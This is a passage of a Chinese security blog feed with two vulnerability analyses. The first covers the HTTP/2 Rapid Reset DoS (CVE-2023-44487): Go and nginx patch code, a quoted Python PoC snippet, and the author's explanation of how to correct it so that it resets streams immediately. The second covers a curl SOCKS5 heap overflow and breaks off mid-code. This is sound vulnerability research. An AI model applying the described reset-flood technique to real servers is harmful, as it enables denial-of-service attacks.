TLSv1.3 (OUT), TLS handshake, Client hello (1):</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, Server hello (2):</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, Certificate (11):</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, CERT verify (15):</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, Finished (20):</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* TLSv1.3 (OUT), TLS handshake, Finished (20):</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* ALPN: server accepted h2</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* Server certificate:</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* subject: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* start date: Oct 12 08:46:51 2023 GMT</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* expire date: Oct 9 08:46:51 2033 GMT</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* issuer: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* SSL certificate verify result: self-signed certificate (18), continuing anyway.</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* using HTTP/2</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* h2h3 [:method: GET]</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* h2h3 [:path: /]</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* h2h3 [:scheme: https]</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* h2h3 [:authority: localhost]</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* h2h3 [user-agent: curl/7.88.1]</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* h2h3 [accept: */*]</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* Using Stream ID: 1 (easy handle 0x55566530a9e0)</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">></span><span style="color:#a6e22e">GET</span> /<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">></span><span style="color:#ae81ff">Host: localhost</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">></span><span style="color:#ae81ff">user-agent: curl/7.88.1</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">></span><span style="color:#ae81ff">accept: */*</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">></span></span></span><span style="display:flex;"><span>* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):</span></span><span style="display:flex;"><span>&lt; HTTP/2 200</span></span><span style="display:flex;"><span>HTTP/2 200</span></span><span style="display:flex;"><span>&lt; content-type: text/plain; charset=utf-8</span></span><span style="display:flex;"><span>content-type: text/plain; charset=utf-8</span></span><span style="display:flex;"><span>&lt; content-length: 12</span></span><span style="display:flex;"><span>content-length: 12</span></span><span style="display:flex;"><span>&lt; date: Fri, 13 Oct 2023 06:52:06 GMT</span></span><span style="display:flex;"><span>date: Fri, 13 Oct 2023 06:52:06 GMT</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>&lt;</span></span><span style="display:flex;"><span>* Connection #0 to host localhost left intact</span></span><span style="display:flex;"><span>Hello World!#</span></span></code></pre></div><h3 id="技术分析">技术分析</h3><p>其实这个在我看来某些方面看也不算漏洞，根据<a href="https://datatracker.ietf.org/doc/html/rfc9113#name-stream-concurrency" target="_blank">RFC9113</a>规定，在HTTP2 setting阶段服务器可以声明支持的最大并发流，同时规定了客户端或服务端可以随时发送RST_STREAM以取消流，在收到RST_STREAM接收方不能在发送其他数据，除了优先级，协议并未规定客户端发送RST_STREAM的阈值，那么各大语言和软件实现的时候可能限制也有可能不限制RST_STREAM的阈值。这属于是各自实现方式的问题。
从协议层面讲，客户端直接RST_STREAM没有问题，典型的场景是用户在浏览器访问网站期间因为某些原因直接关闭了页面，此时浏览器需要向服务端发送RST_STREAM帧来取消流，可以帮助服务器节省资源。</p><h4 id="http的几种ddos">HTTP的几种DDOS</h4><ul><li>HTTP 1.1
在HTTP 1.1中使用单个TCP连接顺序发送请求和响应，在前面的请求被响应之后才可以发送后续的请求，不能被多路复用，此时如果要对其进行DOS的话需要大量机器打开TCP连接顺序发送请求，消耗资源。</li><li>HTTP 2
HTTP2中实现了多路复用和并发，可以异步请求，客户端和服务端通过流ID来识别数据属于哪一个请求，这和HTTP1.1 相比，客户端可以启用大量并行请求，造成服务器负载上升，所以为了防护这种情况，在HTTP2初始化的时候，<code>SETTINGS_MAX_CONCURRENT_STREAMS</code>允许服务器向客户端通告最大允许的并发流，超过这个限制的流，服务器会返回RST_STREAM来拒绝这个流。HTTP2各个状态可以使用状态机表示，当服务器收到客户端发送的HEADERS帧时，会将流状态从空闲转换为打开，而后转为半关闭状态，<strong>只有流处于打开状态或半关闭状态才会被计入打开的流数量</strong>。</li></ul><p><img alt="" src="/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/Request-stream-states.png"/></p><p>来源:<a href="https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/" target="_blank">https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/</a></p><p>上面提到，只有打开和半关闭的流才会计入流数量，影响并发限制，当客户端发送RST_STREAM时，流状态会从半关闭状态转入关闭状态，即释放了一个流，此时客户端可以立即发起一个新请求占用释放的流，这就是CVE-2023-44487的关键。恶意客户端可以在打开大量流之后立即发送RST_STREAM帧，这样在请求到达服务器，而服务器暂未准备好响应时，这个请求的RST_STREAM帧随机到达服务器，服务器取消这个流并释放一个并发流。</p><p><img alt="" src="/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/2023_worlds_largest_rapid_reset_diagram.max-1616x909.png"/>
图片来源：<a href="https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack" target="_blank">https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack</a></p><p>在标准HTTP2 DDOS的时候，恶意客户端可以打开服务器允许的最大限制的流数量而后发送请求，服务器依次响应，循环这个过程，消耗服务器资源。
而变种HTTP2 DDOS中，攻击者可以利用CVE-2023-44487 绕过这个限制，滥用HTTP 2的取消请求，快速重置无限数量的流，根据RFC 服务器收到RST_STREAM帧之后不需要返回数据，在现实实现时，服务器收到了客户端的HRADERS请求，在收到RST_STREAM之前，需要解析客户端请求的资源，在收到RST_STREAM之后需要释放资源，所以在客户端只需要付出带宽的代价下，服务器会付出比这个高得多的代价，导致高效率的DDOS。</p><p><strong>补丁分析</strong></p><p>在go中支持HTTP2协议的解析，所以go也受这个漏洞影响，下面是go修复漏洞的补丁diff
对比go修复这个漏洞的补丁，主要修复逻辑在http2#scheduleHandler，其中advMaxStreams默认为250，当在处理的流超过了250，则比较未开始处理的流数量是否大于1000，大于则报错。
可以看出来补丁主要是限制了同时并发流的数量。该方法在processHeaders中调用，可以看出来，在原先逻辑中，会直接处理客户端请求，而在补丁中会判断当前流的数量，在范围内才会调用<code>go sc.runHandler(rw, req, handler)</code>处理请求</p><p><img alt="" src="/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/6.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span><span style="color:#a6e22e">unstartedHandler</span><span style="color:#66d9ef">struct</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">streamID</span><span style="color:#66d9ef">uint32</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">rw</span><span style="color:#f92672">*</span><span style="color:#a6e22e">responseWriter</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span><span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">handler</span><span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>,<span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>)</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// scheduleHandler starts a handler goroutine,</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// or schedules one to start as soon as an existing handler finishes.</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">sc</span><span style="color:#f92672">*</span><span style="color:#a6e22e">serverConn</span>)<span style="color:#a6e22e">scheduleHandler</span>(<span style="color:#a6e22e">streamID</span><span style="color:#66d9ef">uint32</span>,<span style="color:#a6e22e">rw</span><span style="color:#f92672">*</span><span style="color:#a6e22e">responseWriter</span>,<span style="color:#a6e22e">req</span><span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>,<span style="color:#a6e22e">handler</span><span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>,<span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>))<span style="color:#66d9ef">error</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">serveG</span>.<span style="color:#a6e22e">check</span>()</span></span><span style="display:flex;"><span><span style="color:#a6e22e">maxHandlers</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">advMaxStreams</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">curHandlers</span> &lt;<span style="color:#a6e22e">maxHandlers</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">curHandlers</span><span style="color:#f92672">++</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">go</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">runHandler</span>(<span style="color:#a6e22e">rw</span>,<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">handler</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">nil</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span>) > int(<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">advMaxStreams</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">countError</span>(<span style="color:#e6db74">"too_many_early_resets"</span>,<span style="color:#a6e22e">ConnectionError</span>(<span style="color:#a6e22e">ErrCodeEnhanceYourCalm</span>))</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span> = append(<span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span>,<span style="color:#a6e22e">unstartedHandler</span>{</span></span><span style="display:flex;"><span><span style="color:#a6e22e">streamID</span>:<span style="color:#a6e22e">streamID</span>,</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rw</span>:<span style="color:#a6e22e">rw</span>,</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>:<span style="color:#a6e22e">req</span>,</span></span><span style="display:flex;"><span><span style="color:#a6e22e">handler</span>:<span style="color:#a6e22e">handler</span>,</span></span><span style="display:flex;"><span> })</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">nil</span></span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">sc</span><span style="color:#f92672">*</span><span style="color:#a6e22e">serverConn</span>)<span style="color:#a6e22e">handlerDone</span>() {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">serveG</span>.<span style="color:#a6e22e">check</span>()</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">curHandlers</span><span style="color:#f92672">--</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">i</span><span style="color:#f92672">:=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">maxHandlers</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">advMaxStreams</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ;<span style="color:#a6e22e">i</span> &lt; len(<span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span>);<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">u</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span>[<span style="color:#a6e22e">i</span>]</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">streams</span>[<span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">streamID</span>]<span style="color:#f92672">==</span><span style="color:#66d9ef">nil</span> {</span></span><span style="display:flex;"><span><span style="color:#75715e">// This stream was reset before its goroutine had a chance to start.</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">continue</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">curHandlers</span><span style="color:#f92672">>=</span><span style="color:#a6e22e">maxHandlers</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">curHandlers</span><span style="color:#f92672">++</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">go</span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">runHandler</span>(<span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">rw</span>,<span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">handler</span>)</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span>[<span style="color:#a6e22e">i</span>] =<span style="color:#a6e22e">unstartedHandler</span>{}<span style="color:#75715e">// don't retain references</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span> =<span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span>[<span style="color:#a6e22e">i</span>:]</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sc</span>.<span style="color:#a6e22e">unstartedHandlers</span> =<span style="color:#66d9ef">nil</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>nginx针对这个漏洞也出了一份<a href="https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/" target="_blank">官方通告</a>指出默认配置不受此漏洞影响，即 keepalive_requests 1000;http2_max_concurrent_streams 128;这个配置也可以对应上go补丁中的250最大stream和1000个队列。</p><p><img alt="" src="/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/1.png"/></p><p>虽然默认配置不受该漏洞影响，但nginx也针对这个漏洞进行了修复，commit为<a href="https://github.com/nginx/nginx/commit/6ceef192e7af1c507826ac38a2d43f08bf265fb9" target="_blank">6ceef192e7af1c507826ac38a2d43f08bf265fb9</a>，在该commit中也是统计并限制了并发流数量，超过某个阈值则返回错误。</p><p><img alt="" src="/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/3.png"/></p><p><strong>开发PoC</strong></p><p>在GitHub的<a href="https://github.com/imabee101/CVE-2023-44487/blob/main/main.py" target="_blank">PoC</a>经过实际测试，<strong>没有达到谷歌和CF所说的在发HTTP2请求之后立马重置，也就是无效PoC</strong>。根据代码逻辑，在发送HTTP2 header之后PoC接着尝试接收服务器返回的数据，如果服务端返回了StreamReset则打印已成功取消，如果是RequestReceived则调用conn.reset_stream，<strong>但实际利用应该是发送HTTP2 header之后立马发送RST_Stream，而后打开一个新流重复如上过程</strong>。
实际测试发现，conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)永远不会被调用到，也就是该PoC会执行完整的HTTP2请求，完事之后服务端返回RST_STREAM，打印已取消，这明显是错误的。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> stream_id<span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>get_next_available_stream_id()</span></span><span style="display:flex;"><span> conn<span style="color:#f92672">.</span>send_headers(</span></span><span style="display:flex;"><span> stream_id,</span></span><span style="display:flex;"><span> [(<span style="color:#e6db74">':method'</span>,<span style="color:#e6db74">'GET'</span>), (<span style="color:#e6db74">':authority'</span>, url), (<span style="color:#e6db74">':path'</span>,<span style="color:#e6db74">'/'</span>), (<span style="color:#e6db74">':scheme'</span>,<span style="color:#e6db74">'https'</span>)],</span></span><span style="display:flex;"><span> )</span></span><span style="display:flex;"><span> sock<span style="color:#f92672">.</span>sendall(conn<span style="color:#f92672">.</span>data_to_send())</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e"># Read some data</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span><span style="color:#66d9ef">True</span>:</span></span><span style="display:flex;"><span> data<span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">65535</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">not</span> data:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> events<span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>receive_data(data)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> event<span style="color:#f92672">in</span> events:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> isinstance(event, RequestReceived):</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cancel the stream with error code for CANCEL</span></span></span><span style="display:flex;"><span> conn<span style="color:#f92672">.</span>reset_stream(event<span style="color:#f92672">.</span>stream_id, error_code<span style="color:#f92672">=</span>ErrorCodes<span style="color:#f92672">.</span>CANCEL)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> isinstance(event, StreamReset):</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">f</span><span style="color:#e6db74">"Stream</span><span style="color:#e6db74">{</span>event<span style="color:#f92672">.</span>stream_id<span style="color:#e6db74">}</span><span style="color:#e6db74"> cancelled."</span>)</span></span></code></pre></div><p>所以我们只需要将接收数据的逻辑去掉，改为发送headers之后直接发送reset即可，PoC晚些时候会上传到<a href="https://github.com/Chestnuts4" target="_blank">GitHub</a>上。
利用效果如下，单个进程单个线程可以使服务CPU占用20%</p><p><img alt="" src="/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/2.png"/></p><p>当然这个漏洞PoC也适合使用go写，我这边go写的并发有点问题，不如python版本稳定。</p><p><strong>抓包分析</strong></p><p>运行PoC抓包，解密，wireshark摘要如下：</p><p><img alt="" src="/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/4.png"/></p><p>在本次环境中，服务器通告的最大并发流为250。在下面的数据包中，客户端先发送HEADERS请求，而后发送RST_STREAM请求，循环往复。</p><p><img alt="" src="/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/5.png"/></p><p>通过这种办法客户端不用等待服务器响应，发送速率只受自己带宽限制，从而并非服务器在HTTP2协议初始化时声明的最大并发流限制。</p><h3 id="小结">小结</h3><p>HTTP2 DOS原理较为简单，利用RFC所规定的协议特性，本质上属于滥用，而CloudFlare对此的应对策略是当客户端重置次数超过某个阈值则认为是恶意客户端，关闭该连接。</p><p><img alt="" src="/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/7.png"/></p><p>由于nginx默认配置不受影响，所以受此漏洞影响的大部分是go 或者java启动的HTTP服务，同时如果使用nginx反代后端服务，即使后端服务支持HTTP2，nginx也会将请求降级到HTTP 1.1。</p><p>可预见的将来，此次这种漏洞的出现不会是最后一次，hope the internet will become more and more secure.</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers" target="_blank">https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers</a></p><p><a href="https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack" target="_blank">https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack</a></p><p><a href="https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/" target="_blank">https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/</a></p><p><a href="https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/" target="_blank">https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/</a></p></blockquote><p><strong>Created at 2023-10-13T15:11:25+08:00</strong></p></description></item><item><title>CVE-2023-38545 Curl 堆溢出漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/</link><pubDate>Wed, 11 Oct 2023 20:40:32 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/</guid><description><h3 id="基本信息">基本信息</h3><p>在libcurl中存在堆溢出漏洞，当libcurl通过socks5代理发送请求时，如果hostname大于255则会在本地解析，但由于状态机错误导致没有按照预期解析，而是把主机名拷贝到缓冲区中，攻击者可以通过构造超长主机名触发堆溢出。</p><h3 id="影响版本">影响版本</h3><p>7.69.0 &lt;= libcurl &lt;= 8.3.4</p><h3 id="环境搭建">环境搭建</h3><pre tabindex="0"><code>sudo apt-get build-dep curl
autoreconf
./configure --with-openssl --prefix=$HOME/code/c/curl-8.3.0/build --enable-debug
make -j 16
make install</code></pre><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>补丁</strong>
漏洞在<a href="https://github.com/curl/curl/commit/fb4415d8aee6c1045be932a34fe6107c2f5ed147" target="_blank">fb4415d8aee6c1045be932a34fe6107c2f5ed147</a>修复，修复代码如下<img alt="" src="/images/vulnerability/CVE-2023-38545-curl-heap-overflow.zh-cn.assets/1.png"/></p><p>从修复代码中可以看出两个区别</p><ul><li>当socks5_resolve_local=false and hostname_len >255 时返回CURLPX_LONG_HOSTNAME错误码，而原先逻辑为将socks5_resolve_local设为true</li><li>将hostname_len转为unsigned char后赋值给<code>socksreq[len++]</code>
修复代码位于do_SOCKS5函数，该函数由connect_SOCKS函数调用</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> CURLcode<span style="color:#a6e22e">connect_SOCKS</span>(<span style="color:#66d9ef">struct</span> Curl_cfilter<span style="color:#f92672">*</span>cf,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> socks_state<span style="color:#f92672">*</span>sxstate,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Curl_easy<span style="color:#f92672">*</span>data)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span>(conn<span style="color:#f92672">-></span>socks_proxy.proxytype) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> CURLPROXY_SOCKS5:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> CURLPROXY_SOCKS5_HOSTNAME:</span></span><span style="display:flex;"><span> pxresult<span style="color:#f92672">=</span><span style="color:#a6e22e">do_SOCKS5</span>(cf, sxstate, data);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span></code></pre></div><p>向上追溯connect_SOCKS由socks_proxy_cf_connect调用，socks_proxy_cf_connect被存储在了一个结构体中</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> CURLcode<span style="color:#a6e22e">socks_proxy_cf_connect</span>(<span style="color:#66d9ef">struct</span> Curl_cfilter<span style="color:#f92672">*</span>cf,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Curl_easy<span style="color:#f92672">*</span>data,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> blocking,<span style="color:#66d9ef">bool</span><span style="color:#f92672">*</span>done)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> CURLcode result;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> connectdata<span style="color:#f92672">*</span>conn<span style="color:#f92672">=</span> cf<span style="color:#f92672">-></span>conn;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> sockindex<span style="color:#f92672">=</span> cf<span style="color:#f92672">-></span>sockindex;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> socks_state<span style="color:#f92672">*</span>sx<span style="color:#f92672">=</span> cf<span style="color:#f92672">-></span>ctx;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(cf<span style="color:#f92672">-></span>connected) {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>done<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> CURLE_OK;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span> cf<span style="color:#f92672">-></span>next<span style="color:#f92672">-></span>cft<span style="color:#f92672">-></span><span style="color:#a6e22e">do_connect</span>(cf<span style="color:#f92672">-></span>next, data, blocking, done);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(result<span style="color:#f92672">||</span><span style="color:#f92672">!*</span>done)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>sx) {</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">=</span><span style="color:#a6e22e">calloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>sx),<span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>sx)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> CURLE_OUT_OF_MEMORY;</span></span><span style="display:flex;"><span> cf<span style="color:#f92672">-></span>ctx<span style="color:#f92672">=</span> sx;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(sx<span style="color:#f92672">-></span>state<span style="color:#f92672">==</span> CONNECT_INIT) {</span></span><span style="display:flex;"><span><span style="color:#75715e">/* for the secondary socket (FTP), use the "connect to host"</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * but ignore the "connect to port" (use the secondary port)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">sxstate</span>(sx, data, CONNECT_SOCKS_INIT);</span></span><span style="display:flex;"><span> sx<span style="color:#f92672">-></span>hostname<span style="color:#f92672">=</span></span></span><span style="display:flex;"><span> conn<span style="color:#f92672">-></span>bits.httpproxy<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span> conn<span 